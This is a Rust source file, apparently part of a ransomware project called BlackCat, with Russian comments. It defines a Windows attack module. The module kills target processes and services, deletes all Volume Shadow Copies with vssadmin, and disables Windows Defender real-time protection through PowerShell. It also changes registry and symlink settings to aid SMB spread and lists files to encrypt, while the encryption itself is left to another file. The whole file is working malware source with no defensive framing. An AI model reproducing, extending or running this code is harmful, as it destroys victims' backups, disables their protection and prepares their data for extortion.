use std::process::Command;
use walkdir::WalkDir;
use std::path::Path;

pub struct WindowsAttacker {
    config: crate::config::BlackCatConfig,
}

impl WindowsAttacker {
    pub fn new(config: crate::config::BlackCatConfig) -> Self {
        WindowsAttacker { config }
    }
    
    /// Завершает целевые процессы
    pub fn kill_processes(&self) -> Result<(), Box<dyn std::error::Error>> {
        for process in &self.config.kill_processes {
            println!("[*] Killing process: {}", process);
            
            // taskkill /F /IM <process>.exe
            let output = Command::new("taskkill")
                .args(&["/F", "/IM", &format!("{}.exe", process)])
                .output();
            
            match output {
                Ok(output) => {
                    if output.status.success() {
                        println!("[+] Successfully killed: {}", process);
                    }
                }
                Err(e) => {
                    println!("[!] Failed to kill {}: {}", process, e);
                }
            }
        }
        Ok(())
    }
    
    /// Завершает целевые сервисы
    pub fn kill_services(&self) -> Result<(), Box<dyn std::error::Error>> {
        for service in &self.config.kill_services {
            println!("[*] Stopping service: {}", service);
            
            // net stop <service> /y
            let _output = Command::new("net")
                .args(&["stop", service, "/y"])
                .output();
        }
        Ok(())
    }
    
    /// Удаляет Volume Shadow Copies
    pub fn delete_shadow_copies(&self) -> Result<(), Box<dyn std::error::Error>> {
        if !self.config.windows_options.enable_shadow_copy_deletion {
            return Ok(());
        }
        
        println!("[*] Deleting shadow copies...");
        
        // vssadmin delete shadows /all /quiet
        let output = Command::new("vssadmin")
            .args(&["delete", "shadows", "/all", "/quiet"])
            .output()?;
        
        if output.status.success() {
            println!("[+] Shadow copies deleted successfully");
        } else {
            println!("[!] Shadow copy deletion may have failed");
        }
        
        Ok(())
    }
    
    /// Отключает Windows Defender
    pub fn disable_windows_defender(&self) -> Result<(), Box<dyn std::error::Error>> {
        if !self.config.windows_options.enable_defender_disable {
            return Ok(());
        }
        
        println!("[*] Disabling Windows Defender...");
        
        // Завершаем MSSense.exe процесс
        let _output = Command::new("taskkill")
            .args(&["/F", "/IM", "MSSense.exe"])
            .output();
        
        // Отключаем Real-Time Protection (требует admin)
        let _output = Command::new("powershell")
            .args(&[
                "-Command",
                "Set-MpPreference -DisableRealtimeMonitoring $true"
            ])
            .output();
        
        println!("[+] Windows Defender disabling attempted");
        Ok(())
    }
    
    /// Модифицирует Registry для увеличения SMB параллелизма
    pub fn modify_registry_for_smb(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Modifying Registry for SMB optimization...");
        
        // Увеличиваем MaxMpxCt для параллельных SMB операций
        let _output = Command::new("reg")
            .args(&[
                "add",
                "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters",
                "/v", "MaxMpxCt",
                "/t", "REG_DWORD",
                "/d", "65535",
                "/f"
            ])
            .output();
        
        // Включаем Symbolic Links для remote shares
        let _output = Command::new("fsutil")
            .args(&["behavior", "set", "SymlinkEvaluation", "R2L:1", "R2R:1"])
            .output();
        
        println!("[+] Registry modifications applied");
        Ok(())
    }
    
    /// Находит все файлы для шифрования (исключая whitelist)
    pub fn enumerate_files_to_encrypt(&self, root_path: &str) -> Vec<std::path::PathBuf> {
        let mut files_to_encrypt = Vec::new();
        
        for entry in WalkDir::new(root_path)
            .into_iter()
            .filter_map(|e| e.ok())
        {
            let path = entry.path();
            
            // Пропускаем директории
            if path.is_dir() {
                continue;
            }
            
            // Проверяем исключения
            let file_name = path.file_name().unwrap_or_default().to_string_lossy();
            let extension = path.extension().unwrap_or_default().to_string_lossy();
            
            // Пропускаем исключенные директории
            let is_excluded_dir = self.config.exclude_directories.iter()
                .any(|d| path.to_string_lossy().contains(d));
            
            if is_excluded_dir {
                continue;
            }
            
            // Пропускаем исключенные расширения
            let is_excluded_ext = self.config.exclude_extensions.iter()
                .any(|e| e == extension.as_ref());
            
            if is_excluded_ext {
                continue;
            }
            
            files_to_encrypt.push(path.to_path_buf());
        }
        
        println!("[*] Found {} files to encrypt", files_to_encrypt.len());
        files_to_encrypt
    }
    
    /// Основная функция для Windows атаки
    pub async fn execute(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Starting BlackCat Windows attack...");
        println!("[*] Access Token: {}", self.config.access_token);
        
        // Фаза 1: Preparation
        self.kill_processes()?;
        self.kill_services()?;
        self.delete_shadow_copies()?;
        self.disable_windows_defender()?;
        self.modify_registry_for_smb()?;
        
        // Фаза 2: Enumeration & Encryption (будет реализовано в ransomware.rs)
        
        println!("[+] Windows attack preparation completed");
        
        Ok(())
    }
}
